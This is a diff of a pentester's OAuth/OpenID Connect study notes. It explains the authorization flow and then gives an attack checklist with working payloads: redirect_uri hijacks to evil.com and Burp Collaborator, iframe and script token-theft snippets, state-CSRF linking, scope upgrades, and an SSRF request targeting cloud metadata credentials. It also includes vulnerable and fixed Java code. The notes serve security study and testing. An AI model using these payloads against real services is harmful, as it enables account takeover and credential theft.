@@ -1,90 +1,297 @@
-## Basic Information
 
-Oauth is  a Authorization  framework that enables application to access or perform actions on a user's account in another application
+tactic: Initial Access
 
-## methodology
-
-example.com is designed to showcase all our social media posts 
-
-example.com will request our permission to access your social media posts a consent screen will appear on the sociamedia.com outlining the permissions being requested and the developer making the request. 
-
-
-- resource owner: user , authorizer to your resource , like social media account 
-
-- resource server:  the server managing authenticated requests after the application has secured an `access token` on behalf of the `resource owner`
-
-- client application:  the application seeking authorization form the `resource owner` such as `example.com`
-
-- authorization server: the server that issues `access token` to the `client application` following the successful authentication of the `resource owner` and securing authorization 
-- client id: public , unique identifier for the application
-- client secret: A confidential key ,known solely to the ***application and the authorization server*** , used to generating `access_token`
-- response type: A value specifying the type of token requested, like `code`
-- scope: the level of access the `client application` is requesting from the `resource owner`
-- redirected URL: the URL to which the user is redirected after authorization 
-- state: a parameter to maintain data across the user's redirection to and from the authorization server. kinda like CSRF protection mechanism.
-- grant type: parameter indicating the grant type and the type of token to be returned
-- code: the authorization code from the `authorization server` use in tandem with `client id` and `client secret` by the client application to acquire an `access token`
-- access token:  the token that the client application uses for API requests on behalf of the `resource owner` 
-- refresh token: enables the application to obtain a new `access token` without re prompting the user.
-## FLOW
-
-
-1) navigate to example.com and select integrate with social media 
-2) the site requests social.com asking for authorization to let example.com application access your posts structured as 
-``` HTTP
-https://socialmedia.com/auth
-?response_type=code
-&client_id=example_clientId
-&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
-&scope=readPosts
-&state=randomString123
-```
-3) present with consent page
-4) social media sends a response to the `redirect uri` with the `code` and `state` parameter ````
-https://example.com?code=uniqueCode123&state=randomString123
-5)  example.com utilizes `code` together with its `client id` and `client secret` to make a server side request to obtain an `access token` on our behalf, enabling access to the permission we consented: 
+**OAuth 2.0** is an authorization framework that lets a third-party application access a user's resources on another service  without ever seeing their password. Instead of credentials, it uses **access tokens**.
 
 ```
+User → Client App → Authorization Server → issues token → Client App accesses Resource Server
+```
+
+
+
+## Key Concepts
+
+|Term|What it means|
+|---|---|
+|Resource Owner|The user who owns the data|
+|Client Application|The app requesting access (e.g. example.com)|
+|Authorization Server|Issues tokens after user consents|
+|Resource Server|Holds the user's data, accepts tokens|
+|`client_id`|Public identifier for the app|
+|`client_secret`|Private key known only to app + auth server|
+|`redirect_uri`|Where the user lands after authorization|
+|`scope`|What permissions are being requested|
+|`state`|CSRF protection — random value tied to session|
+|`code`|Short-lived auth code exchanged for a token|
+|`access_token`|Token used to call APIs on the user's behalf|
+|`id_token`|JWT with user identity info (OpenID Connect only)|
+
+---
+
+## Authorization Code Flow
+
+```
+1. User clicks "Login with SocialMedia" on example.com
+
+2. example.com redirects user to auth server:
+GET https://socialmedia.com/auth
+  ?response_type=code
+  &client_id=example_clientId
+  &redirect_uri=https://example.com/callback
+  &scope=readPosts
+  &state=randomString123
+
+3. User sees consent screen → approves
+
+4. Auth server redirects back with code:
+GET https://example.com/callback?code=uniqueCode123&state=randomString123
+
+5. example.com exchanges code server-side:
 POST /oauth/access_token
 Host: socialmedia.com
-...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
+{"client_id":"example_clientId","client_secret":"example_clientSecret",
+"code":"uniqueCode123","grant_type":"authorization_code"}
+
+6. Auth server returns access_token
+7. example.com calls API using Bearer token
 ```
-6) finally, the process concludes as example.com employs your `access token` to make an API call
 
+---
 
-## OpenID Connect
+## OpenID Connect (OIDC)
 
-- extends the Oauth protocol to provide a dedicated id and authentication layer that sits on top of the basic Oauth implementation. 
--  the key diffrerence is that there is an additional , set of scopes that are the same for all providers and extra response type: `id_token`
+Extension on top of OAuth that adds **authentication** (not just authorization). Introduces:
 
-### Methodology
+- `id_token` — a signed JWT containing user identity claims (sub, email, name)
+- `openid` scope — must be included to trigger OIDC
+- `/userinfo` endpoint — returns user claims using the access token
+- `/.well-known/openid-configuration` — discovery endpoint listing all server URLs
 
-- Relying party:  the application that is requesting authentication of a user. 
-- End user: user who is being authenticated
-- openID provider: Oauth service that is configured to support openID Connect
+---
 
-- Claims refer to `Key:Value` pairs that represent information about the user on the resource server.
-- ID token: returns JWT token  signed with a JSON web sig. JWT payload contains list of claims based on the scope that was initially requested.
-### Methods
+## Injection Points
 
- Leaking authorization codes and access tokens
-- by stealing a valid code or token the attacker may be able to access the victim's data. Ultimately this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this Outh service  the token is sent via victim's browser to the `/callback` endpoint that is specified in the `redirected uri`  if the Oauth service fails to validate the URI properly an attacker may be able to construct a CSRF like attack tricking the victims browser into initialting an Oauth flow that send the code to an attacker controlled `redict uri`
+- `redirect_uri` parameter — improperly validated allows token/code theft
+- `state` parameter — missing or static = CSRF on the OAuth flow
+- `scope` parameter — flawed validation may allow privilege upgrade
+- Dynamic client registration — `logo_uri`, `jwks_uri` etc. can trigger SSRF
+- Implicit flow — tokens exposed in URL fragment, visible in browser history/logs
+- `/userinfo` endpoint — may accept arbitrary scope upgrades
 
+---
 
-Flawed redirect uri  validation
+## Checklist
 
+### Redirect URI Abuse
 
--  try and fuzz with the `redirected uri`  para 
-	-  some checks only that the string starts with the correct seqence of chars approves the domain, try removing or adding arbitrary paths
-	-  try appending extra values to the default `redirect uri` param like ``https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/``
-	-  try server side param pollution  ``https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net``
-	-  also try ``localhost.evil-user.net`.`
-	- changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`,
+- [ ]  Replace `redirect_uri` with your Burp Collaborator — does it redirect?
 
-Stealing codes and access tokens via proxy page 
-- try to find ways that you can successfully acccess different subdomains or paths , the default URI will often be on an Oauth such as /Oauth/callback which is likely to have intersting subdirectories.  so try this ``https://client-app.com/oauth/callback/../../example/path``
-- once  we identified which other pages we are able to set as the redirect URI 
+```
+	&redirect_uri=https://YOUR.BURP.COLLABORATOR
+```
 
+- [ ]  Try path traversal on the callback:
+
+```
+	&redirect_uri=https://client-app.com/oauth/callback/../../evil/path
+```
+
+- [ ]  Try appending extra hosts:
+
+```
+	https://default-host.com&@evil.net#@bar.evil.net/
+```
+
+- [ ]  Try duplicate `redirect_uri` params (param pollution):
+
+```
+	&redirect_uri=client-app.com/callback&redirect_uri=evil.net
+```
+
+- [ ]  Try `localhost` variations:
+
+```
+	localhost.evil.net
+```
+
+- [ ]  Change `response_mode` from `query` to `fragment` — may break URI validation
+
+### State Parameter (CSRF)
+
+- [ ]  Check if `state` is present in the auth request
+- [ ]  Check if `state` is validated on callback — drop/change it, does it still work?
+- [ ]  If missing → OAuth flow is CSRF-able → force victim to link attacker's account
+
+### Scope Upgrade
+
+- [ ]  After getting a token with limited scope, manually add extra scopes to `/userinfo`:
+
+```
+	GET /userinfo?scope=openid%20profile%20email%20admin
+	Authorization: Bearer <token>
+```
+
+- [ ]  Check if auth server honours the upgraded scope without re-consent
+
+### Implicit Flow
+
+- [ ]  Look for `response_type=token` in the auth request — token lands in URL fragment
+- [ ]  Check if the app posts the token to the server without re-validating it server-side
+- [ ]  Try submitting someone else's email in the POST to `/authenticate`:
+
+json
+
+```json
+	{"email":"victim@example.com"}
+```
+
+### Open Redirect Chaining
+
+- [ ]  Find an open redirect anywhere on the client app
+- [ ]  Chain it into `redirect_uri` to steal the code/token:
+
+```
+	&redirect_uri=https://client-app.com/oauth/callback/../post/next?path=https://evil.com
+```
+
+### SSRF via Dynamic Client Registration
+
+- [ ]  Visit `/.well-known/openid-configuration` → find `/registration` endpoint
+- [ ]  Register a client with SSRF payload in `logo_uri` or `jwks_uri`:
+
+json
+
+```json
+	{
+	    "redirect_uris": ["https://example.com"],
+	    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+	}
+```
+
+- [ ]  Trigger the fetch by visiting `/client/<client_id>/logo`
+
+---
+
+## Attack Payloads
+
+**Force OAuth profile linking (CSRF — missing state):**
+
+```html
+<iframe src="https://vulnerable.com/oauth-linking?code=STOLEN_CODE"></iframe>
+```
+
+**Redirect URI hijack — deliver to victim:**
+
+```html
+<iframe src="https://oauth-server.net/auth
+  ?client_id=APP_ID
+  &redirect_uri=https://evil.com
+  &response_type=code
+  &scope=openid%20profile%20email">
+</iframe>
+```
+
+**Open redirect + implicit flow token theft:**
+
+```html
+<script>
+    if (!document.location.hash) {
+        window.location = "https://oauth-server.net/auth
+          ?client_id=APP_ID
+          &redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://evil.com/exploit
+          &response_type=token
+          &nonce=123456
+          &scope=openid%20profile%20email"
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+
+---
+
+## White Box Testing
+
+**Vulnerable — `redirect_uri` not validated:**
+
+```java
+@GetMapping("/oauth/callback")
+public RedirectView oauthCallback(@RequestParam String code,
+                                  @RequestParam String redirect_uri) {
+    // ← redirect_uri taken directly from user input, no whitelist check
+    String token = exchangeCode(code, redirect_uri);
+    return new RedirectView(redirect_uri);
+}
+```
+
+**Vulnerable — `state` not verified:**
+
+```java
+@GetMapping("/callback")
+public String callback(@RequestParam String code,
+                       HttpSession session) {
+    // ← state param never checked against session
+    String token = getToken(code);
+    loginUser(token);
+    return "redirect:/dashboard";
+}
+```
+
+**Vulnerable — implicit flow trusts client-supplied email:**
+
+```java
+@PostMapping("/authenticate")
+public ResponseEntity<?> authenticate(@RequestBody Map<String, String> body) {
+    String email = body.get("email");
+    // ← no token validation, trusts whatever email the client sends
+    User user = userRepository.findByEmail(email);
+    loginUser(user);
+    return ResponseEntity.ok().build();
+}
+```
+
+**Secure:**
+
+```java
+// Whitelist redirect URIs in application.properties
+// oauth.allowed-redirect-uris=https://client-app.com/callback
+
+@Value("${oauth.allowed-redirect-uris}")
+private List<String> allowedRedirectUris;
+
+// Validate redirect_uri against whitelist
+private void validateRedirectUri(String uri) {
+    if (!allowedRedirectUris.contains(uri)) {
+        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid redirect_uri");
+    }
+}
+
+// Validate state against session
+private void validateState(String state, HttpSession session) {
+    String expected = (String) session.getAttribute("oauth_state");
+    if (expected == null || !expected.equals(state)) {
+        throw new ResponseStatusException(HttpStatus.FORBIDDEN, "Invalid state");
+    }
+    session.removeAttribute("oauth_state");
+}
+
+// Always verify identity server-side via token — never trust client-supplied claims
+private String resolveUser(String accessToken) {
+    // fetch /userinfo with the token and use 'sub' claim
+    return oauthClient.getUserInfo(accessToken).getSub();
+}
+```
+
+---
+# LABS
+
+###  Authentication bypass via OAuth implicit flow
+
+POST /auth
+`
+`{"email":"carlos@carlos-montoya.net"`
+
+right click to request in original session
 
 ### Flawed scope validation
 
@@ -98,17 +305,6 @@ POST /token Host: oauth-authorization-server.com … client_id=12345&client_secr
 ```
 
 - end a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.
-- 
-
-# LABS
-
-###  Authentication bypass via OAuth implicit flow
-
-POST /auth
-`
-`{"email":"carlos@carlos-montoya.net"`
-
-right click to request in original session
 
 
 
@@ -187,3 +383,7 @@ submit secret access token
 # References
 - https://www.marcobehler.com/images/guides/oauth2/oauth2_flow_v2-8c394ca4.png
 - https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
+- [PortSwigger OAuth Labs](https://portswigger.net/web-security/oauth)
+- [HackTricks OAuth to Account Takeover](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover)
+- [OAuth 2.0 Flow Diagram](https://www.marcobehler.com/images/guides/oauth2/oauth2_flow_v2-8c394ca4.png)
+
